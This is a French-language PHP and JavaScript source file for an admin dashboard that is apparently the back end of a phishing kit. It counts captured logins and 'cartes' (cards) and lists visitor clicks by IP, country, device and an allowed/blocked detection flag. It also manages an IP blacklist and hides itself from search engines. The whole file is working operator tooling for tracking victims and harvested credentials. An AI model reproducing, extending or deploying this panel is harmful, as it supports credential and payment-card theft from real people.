<?php

if (!isset($dbAdminData[$ip]) || $dbAdminData[$ip] != $m) {
    die();
}

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    if (isset($_GET["data"])) {
        $cliques = getr($dbAdminData, "cliques");
        $blip = getr($dbAdminData, "blip");
        echo json_encode([
            "count" => [
                "login" => getr($dbAdminData, "login", 0),
                "cc" => getr($dbAdminData, "cc", 0)
            ],
            "cliques" => array_reverse($cliques),
            "blip" => array_reverse($blip),
        ]);
    } elseif (isset($_GET["blip"])) {
        $id = $_GET["blip"];
        $existingEntries = getr($dbAdminData, "blip");
        $filteredEntries = array_filter($existingEntries, function ($entry) use ($id) {
            return $entry["id"] !== $id;
        });
        $dbAdminData["blip"] = $filteredEntries;
        $dbAdminData["blip"][] = [
            "ip" => $ip,
            "id" => $id,
            "date" => date("d/m/y H:i:s", time()),
        ];
        $dbAdmin->set($host, $dbAdminData);
        echo json_encode(getr($dbAdminData, "blip"));
    } elseif (isset($_GET["delete"])) {
        $d = $_GET["delete"];
        $ds = explode("_", $d);
        if ($d == "all") {
            $dbAdminData = [];
            $dbAdmin->set($host, $dbAdminData);
        } elseif ($d == "allcliques") {
            $dbAdminData["cliques"] = [];
            $dbAdmin->set($host, $dbAdminData);
            echo json_encode($dbAdminData["cliques"]);
        } elseif ($d == "alllogin") {
            $dbAdminData["login"] = 0;
            $dbAdmin->set($host, $dbAdminData);
        } elseif ($d == "allcc") {
            $dbAdminData["cc"] = 0;
            $dbAdmin->set($host, $dbAdminData);
        } elseif (isset($ds[0]) && $ds[0] == "blip" && isset($ds[1])) {
            $existingEntries = getr($dbAdminData, "blip");
            $filteredEntries = array_filter($existingEntries, function ($entry) use ($ds) {
                return $entry["id"] !== $ds[1];
            });
            $dbAdminData["blip"] = $filteredEntries;
            $dbAdmin->set($host, $dbAdminData);
            echo json_encode(getr($dbAdminData, "blip"));
        } else if (isset($ds[0]) && $ds[0] == "clique" && isset($ds[1])) {
            $existingEntries = getr($dbAdminData, "cliques");
            $filteredEntries = array_filter($existingEntries, function ($entry) use ($ds) {
                return $entry["ip"] !== $ds[1];
            });
            $dbAdminData["cliques"] = $filteredEntries;
            $dbAdmin->set($host, $dbAdminData);
            echo json_encode(getr($dbAdminData, "cliques"));
        }
    }

    die();
}

function emptyy()
{
?>
    <div class="empty">
        <div class="empty-icon"><svg xmlns="http://www.w3.org/2000/svg" class="icon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
                <path stroke="none" d="M0 0h24v24H0z" fill="none" />
                <circle cx="12" cy="12" r="9" />
                <line x1="9" y1="10" x2="9.01" y2="10" />
                <line x1="15" y1="10" x2="15.01" y2="10" />
                <path d="M9.5 15.25a3.5 3.5 0 0 1 5 0" />
            </svg></div><!-- <p class="empty-title">Aucune donnée trouvée</p> -->
        <p class="empty-subtitle text-secondary">Aucune donnée trouvée </p>
    </div>
<?php
};

?>
<!DOCTYPE html>
<html lang="fr-FR">

<head>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
    <title>.</title>
    <script src="./views/admin/assets/tablerio.js" defer></script>
    <script src="./views/admin/assets/apexcharts.min.js"></script>
    <script src="./views/admin/assets/jsvectormap.min.js"></script>
    <script src="./views/admin/assets/maps/world.js"></script>
    <script src="./views/admin/assets/maps/world-merc.js"></script>
    <link rel="stylesheet" href="./views/admin/assets/tablerio.css">
    <link rel="stylesheet" href="./views/admin/assets/flag.css">
    <link rel="stylesheet" href="./views/admin/assets/styles.css">
</head>

<body data-bs-theme="dark" class="backSvg">

    <div class="page-wrapper ">
        <div class="page-header d-print-none sticky-top p-3 bg-rdark">
            <div class="container">
                <div class="row g-3 align-items-center">
                    <div class="col-auto">
                        <span class=" status-indicator status-green status-indicator-animated">
                            <span class="status-indicator-circle"></span>
                            <span class="status-indicator-circle"></span>
                            <span class="status-indicator-circle"></span>
                        </span>
                    </div>
                    <div class="col">
                        <h2 class="page-title">
                            <?= $host ?>
                        </h2>
                        <!-- <div class="text-secondary">
							<ul class="list-inline list-inline-dots mb-0">
								<li class="list-inline-item"><span class="text-primary">@loupdzz</span></li>
								<li class="list-inline-item"><a href="https://github.com/zougataga" target="_blank">https://github.com/zougataga</a></li>
							</ul>
						</div> -->
                    </div>
                    <div class="col-md-auto ms-auto d-print-none">
                        <div class="btn-list">
                            <button data-bs-toggle="modal" data-bs-target="#config" class="btn disabled" id="bconfig">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
                                    <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                                    <path d="M10.325 4.317c.426 -1.756 2.924 -1.756 3.35 0a1.724 1.724 0 0 0 2.573 1.066c1.543 -.94 3.31 .826 2.37 2.37a1.724 1.724 0 0 0 1.065 2.572c1.756 .426 1.756 2.924 0 3.35a1.724 1.724 0 0 0 -1.066 2.573c.94 1.543 -.826 3.31 -2.37 2.37a1.724 1.724 0 0 0 -2.572 1.065c-.426 1.756 -2.924 1.756 -3.35 0a1.724 1.724 0 0 0 -2.573 -1.066c-1.543 .94 -3.31 -.826 -2.37 -2.37a1.724 1.724 0 0 0 -1.065 -2.572c-1.756 -.426 -1.756 -2.924 0 -3.35a1.724 1.724 0 0 0 1.066 -2.573c-.94 -1.543 .826 -3.31 2.37 -2.37c1 .608 2.296 .07 2.572 -1.065z"></path>
                                    <path d="M9 12a3 3 0 1 0 6 0a3 3 0 0 0 -6 0"></path>
                                </svg>
                                Config
                            </button>
                            <button data-bs-toggle="modal" data-bs-target="#blip" class="btn btn-primary disabled" id="bblip">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-list" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
                                    <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                                    <path d="M9 6l11 0"></path>
                                    <path d="M9 12l11 0"></path>
                                    <path d="M9 18l11 0"></path>
                                    <path d="M5 6l0 .01"></path>
                                    <path d="M5 12l0 .01"></path>
                                    <path d="M5 18l0 .01"></path>
                                </svg>
                                Blacklist IP
                            </button>
                            <button class="btn btn-danger disabled" onclick="deletedata(event, 'all')" id="breset">
                                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-trash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
                                    <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                                    <path d="M4 7l16 0"></path>
                                    <path d="M10 11l0 6"></path>
                                    <path d="M14 11l0 6"></path>
                                    <path d="M5 7l1 12a2 2 0 0 0 2 2h8a2 2 0 0 0 2 -2l1 -12"></path>
                                    <path d="M9 7v-3a1 1 0 0 1 1 -1h4a1 1 0 0 1 1 1v3"></path>
                                </svg>
                                Tout supprimer
                            </button>
                            <button class="btn btn-success" onclick="refresh(event)" id="breset">
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-refresh">
                                    <path stroke="none" d="M0 0h24v24H0z" fill="none" />
                                    <path d="M20 11a8.1 8.1 0 0 0 -15.5 -2m-.5 -4v4h4" />
                                    <path d="M4 13a8.1 8.1 0 0 0 15.5 2m.5 4v-4h-4" />
                                </svg>
                                Actualiser
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="page-body">
            <div class="container-xl">

                <div style="display: none;" class="alert alert-success alert-dismissible" role="alert" id="alert">
                    <div class="d-flex">
                        <div>
                            <!-- Download SVG icon from http://tabler-icons.io/i/check -->
                            <svg xmlns="http://www.w3.org/2000/svg" class="icon alert-icon" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
                                <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                                <path d="M5 12l5 5l10 -10"></path>
                            </svg>
                        </div>
                        <div id="alertext">

                        </div>
                    </div>
                    <button onclick="document.querySelector('#alert').style='display:none'" class="btn-close"></button>
                </div>


                <div class="row row-cards">
                    <div class="col-md-6">
                        <div class="card bg-rdark">
                            <div class="card-body">
                                <div class="subheader">Nombre de cliques </div>
                                <div class="h3 m-0 mt-1">
                                    <button class="btn" onclick="deletedata(event, 'allcliques')">
                                        <svg xmlns="http://www.w3.org/2000/svg" class="text-danger icon icon-tabler icon-tabler-trash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
                                            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                                            <path d="M4 7l16 0"></path>
                                            <path d="M10 11l0 6"></path>
                                            <path d="M14 11l0 6"></path>
                                            <path d="M5 7l1 12a2 2 0 0 0 2 2h8a2 2 0 0 0 2 -2l1 -12"></path>
                                            <path d="M9 7v-3a1 1 0 0 1 1 -1h4a1 1 0 0 1 1 1v3"></path>
                                        </svg>
                                        <span id="ccliques">
                                            <div class="spinner-border spinner-border-sm" role="status"></div>
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>

                    </div>
                    <div class="col-md-6">
                        <div class="card bg-rdark">
                            <div class="card-body">
                                <div class="subheader">Nombre de login</div>
                                <div class="h3 m-0 mt-1">
                                    <button class="btn" onclick="deletedata(event, 'alllogin')">
                                        <svg xmlns="http://www.w3.org/2000/svg" class="text-danger icon icon-tabler icon-tabler-trash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
                                            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                                            <path d="M4 7l16 0"></path>
                                            <path d="M10 11l0 6"></path>
                                            <path d="M14 11l0 6"></path>
                                            <path d="M5 7l1 12a2 2 0 0 0 2 2h8a2 2 0 0 0 2 -2l1 -12"></path>
                                            <path d="M9 7v-3a1 1 0 0 1 1 -1h4a1 1 0 0 1 1 1v3"></path>
                                        </svg>
                                        <span id="clogin">
                                            <div class="spinner-border spinner-border-sm" role="status"></div>
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div class="col-md-4" style="display: none;">
                        <div class="card bg-rdark">
                            <div class="card-body">
                                <div class="subheader">Nombre de cartes</div>
                                <div class="h3 m-0 mt-1">
                                    <button class="btn" onclick="deletedata(event, 'allcc')">
                                        <svg xmlns="http://www.w3.org/2000/svg" class="text-danger icon icon-tabler icon-tabler-trash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
                                            <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                                            <path d="M4 7l16 0"></path>
                                            <path d="M10 11l0 6"></path>
                                            <path d="M14 11l0 6"></path>
                                            <path d="M5 7l1 12a2 2 0 0 0 2 2h8a2 2 0 0 0 2 -2l1 -12"></path>
                                            <path d="M9 7v-3a1 1 0 0 1 1 -1h4a1 1 0 0 1 1 1v3"></path>
                                        </svg>
                                        <span id="ccc">
                                            <div class="spinner-border spinner-border-sm" role="status"></div>
                                        </span>

                                    </button>
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="col-12" id="cliquesmap">
                        <div class="card bg-rdark d-flex align-items-center justify-content-center w-full h-8">
                            <div class="spinner-grow" role="status"></div>
                        </div>
                    </div>

                    <div class="col-12" style="display: none;" id="cliques"> </div>

                </div>


            </div>



        </div>
    </div>
    </div>

    <div class="modal modal-blur fade" id="blip" tabindex="-1" style="display: none;" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered" role="document">
            <div class="modal-content bg-rdark">
                <div class="modal-header">
                    <h5 class="modal-title">BlackList ip</h5>
                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                </div>
                <div class="modal-body" id="cblip">
                    <div class="d-flex align-items-center justify-content-center w-full h-8">
                        <div class="spinner-grow" role="status"></div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function getel(n) {
            return document.querySelector(`#${n}`)
        }

        function set(n, v) {
            getel(n).innerHTML = v
        }

        function setc(n, t, c) {
            getel(n).classList[t](c)
        }

        function sets(n, s) {
            getel(n).style = s
        }

        function refresh(btn) {
            btn = btn.target;
            btn.classList.add("btn-loading");
            fall(true);
            setTimeout(() => {
                sets('alert', '');
                set('alertext', 'Tout à bien été actualiser !');
                btn.classList.remove("btn-loading")
            }, 500)
        }

        function addblip(e) {
            e.preventDefault();

            const
                btn = e.target.querySelector(".btn-primary"),
                data = {};
            for (const {
                    name,
                    value
                }
                of e.target.elements) {
                name && (data[name] = value)
            }
            btn.classList.add("btn-loading");

            if (data.ip) {
                let xhra = new XMLHttpRequest();
                xhra.open('POST', `./admin?blip=${data.ip}`);
                xhra.addEventListener('load', () => setTimeout(() => fall(true), 500));
                xhra.send()
            }

        }

        function deletedata(event, e) {
            event.target.classList.add("btn-loading");
            let xhra = new XMLHttpRequest();
            xhra.open('POST', `./admin?delete=${e}`);
            xhra.addEventListener('load', () => {
                const c = xhra.responseText;
                if (e == "alllogin" || e == "allcc") {
                    set((e == "allcc" ? "ccc" : 'clogin'), "0")
                }
                setTimeout(() => {
                    if (e.includes("blip")) {
                        // fblip(JSON.parse(c))
                        fall(true);
                    } else if (e == "alllogin" || e == "allcc") {
                        event.target.classList.remove("btn-loading")
                    } else if (e.includes("clique")) {
                        if (e == "allcliques") {
                            event.target.classList.remove("btn-loading")
                        }
                        // fcliques(JSON.parse(c))
                        fall(true);
                    } else if (e == "all") {
                        event.target.classList.remove("btn-loading");
                        fall(true);
                        sets("alert", "");
                        set("alertext", "Tout à bien été supprimer !")
                    }
                }, 500)
            });
            xhra.send()
        }

        function fcliques(cliques) {
            const ccliques = cliques.length;
            set("ccliques", ccliques);

            set("cliquesmap", (ccliques == 0 ?
                `<div class="card bg-rdark"><?= emptyy() ?></div>` :
                `<div class="card bg-rdark">
                    <div class="card-body">
                        <div class="ratio ratio-21x9">
                            <div>
                                <div id="map-world" class="w-100 h-100 jvm-container" style="background-color: transparent;"></div>
                            </div>
                        </div>
                    </div>
                </div> `
            ));

            if (ccliques != 0) {
                const mapData = {};
                cliques.forEach(clique => {
                    const countryCode = clique.countryCode;
                    mapData[countryCode] = (mapData[countryCode] || 0) + 1
                });
                const map = new jsVectorMap({
                    selector: '#map-world',
                    map: 'world',
                    backgroundColor: 'transparent',
                    regionStyle: {
                        initial: {
                            fill: tabler.getColor('body-bg'),
                            stroke: tabler.getColor('border-color'),
                            strokeWidth: 2,
                        }
                    },
                    zoomOnScroll: false,
                    zoomButtons: false,
                    visualizeData: {
                        scale: [tabler.getColor('bg-surface'), tabler.getColor('primary')],
                        values: mapData
                    },
                });

                window.addEventListener("resize", () => map.updateSize());

                let cliquesList = "";

                for (const clique of cliques) {
                    cliquesList += `<div>
                    	<div class="row">
                    		<div class="col-auto">
                    			<span class="flag flag-country-${clique.countryCode.toLowerCase()}"></span>
                    		</div>
                    		<div class="col">
                    			<div class="text-truncate">
                    				<strong>${clique.ip}</strong> / <span class="text-${clique.detection === 'Allowed' ? 'green' : 'danger'}">${clique.detection}</span>
                    			</div>
                    			<div class="text-secondary">
                    				<ul class="list-inline list-inline-dots mb-0">
                    					<li class="list-inline-item"><span class="text-primary">${clique.date}</span></li>
                    					<li class="list-inline-item">${clique.os_device}</li>
                    					<li class="list-inline-item"><a href="/" target="_blank">/</a></li>
                    				</ul>
                    			</div>
                    		</div>
                    		<div class="col-auto align-self-center">
                    			<button class="btn btn-danger" onclick="deletedata(event, 'clique_${clique.ip}')" >
                    				<svg xmlns="http://www.w3.org/2000/svg" style="margin: 0 !important;" class="icon icon-tabler icon-tabler-trash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
                    					<path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                    					<path d="M4 7l16 0"></path>
                    					<path d="M10 11l0 6"></path>
                    					<path d="M14 11l0 6"></path>
                    					<path d="M5 7l1 12a2 2 0 0 0 2 2h8a2 2 0 0 0 2 -2l1 -12"></path>
                    					<path d="M9 7v-3a1 1 0 0 1 1 -1h4a1 1 0 0 1 1 1v3"></path>
                    				</svg>
                    			</button>
                    		</div>
                    	</div>
                    	</div>`
                }

                set("cliques", `
                    	<div class="card bg-rdark" style="min-height: 350px;max-height: 350px;">
									<div class="card-body card-body-scrollable card-body-scrollable-shadow">
										<div class="divide-y">
										${cliquesList}
                                        </div>
									</div>
                    	</div>

                                        `);
                sets("cliques", "");

            } else {
                sets("cliques", "display:none");

            }
        }

        function fblip(blip) {
            const cblip = blip.length;

            set("cblip", `
    <div class="card bg-rdark">
        <div class="card-body ">
            <div class="mb-3">
                <label class="form-label">Input group</label>
                <form onsubmit="addblip(event)" class="input-group mb-2">
                    <input type="text" name="ip" pattern="^([0-9]{1,3}\.){3}[0-9]{1,3}$" 
inputmode="decimal" 
                     onkeypress="return /[0-9\.]/.test(String.fromCharCode(((event||window.event).which||(event||window.event).which)));" required class="form-control" placeholder="Ip...">
                    <button class="btn btn-primary" type="submit">Ajouter</button>
                </form>
            </div>
        </div>
    </div>

    <div class="card bg-rdark" style="min-height: 350px;max-height: 350px;">
        <div class="card-body card-body-scrollable card-body-scrollable-shadow">
            <div class="subheader">Blacklist IP : [${cblip}]</div>
            ${cblip == 0 ?
            `<?= emptyy() ?>`:
            (() =>{
                let html = '<div class="divide-y">';
                for(const data of blip) {
                html+=`<div>
    <div class="row p-1">
        <div class="col">
            <div class="text-truncate">
                <strong>${data.id}</strong>
            </div>
            <div class="text-secondary">
                <ul class="list-inline list-inline-dots mb-0">
                    <li class="list-inline-item"><span class="text-primary">${data.date}</span></li>
                    <li class="list-inline-item"><strong>Par :</strong> ${data.ip||"❌"}</li>
                </ul>
            </div>
        </div>
        <div class="col-auto align-self-center">
            <button class="btn btn-danger" onclick="deletedata(event, 'blip_${data.id}')">
                <svg xmlns="http://www.w3.org/2000/svg" style="margin: 0 !important;" class="icon icon-tabler icon-tabler-trash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
                    <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
                    <path d="M4 7l16 0"></path>
                    <path d="M10 11l0 6"></path>
                    <path d="M14 11l0 6"></path>
                    <path d="M5 7l1 12a2 2 0 0 0 2 2h8a2 2 0 0 0 2 -2l1 -12"></path>
                    <path d="M9 7v-3a1 1 0 0 1 1 -1h4a1 1 0 0 1 1 1v3"></path>
                </svg>
            </button>
        </div>
    </div>
</div>`
                }
                html += "</div>";
                return html
            })()}
        </div>
    </div>
`);

            setc("bblip", "remove", "disabled");
        }


        function fall(t = false) {
            setc("breset", "remove", "disabled");
            let xhra = new XMLHttpRequest();
            xhra.open('POST', './admin?data=true')
            xhra.addEventListener('load', () => {
                const data = JSON.parse(xhra.responseText);
                if (!data) return;

                fcliques(data.cliques);

                set("clogin", data.count.login);
                set("ccc", data.count.cc);

                fblip(data.blip);
                if (t) {
                    const element = document.querySelector(".jvm-tooltip");
                    if (element && element.parentNode) {
                        element.parentNode.removeChild(element);
                    }
                }
            });
            xhra.send()
        }

        document.addEventListener("DOMContentLoaded", setTimeout(fall, 500))
    </script>


</body>

</html>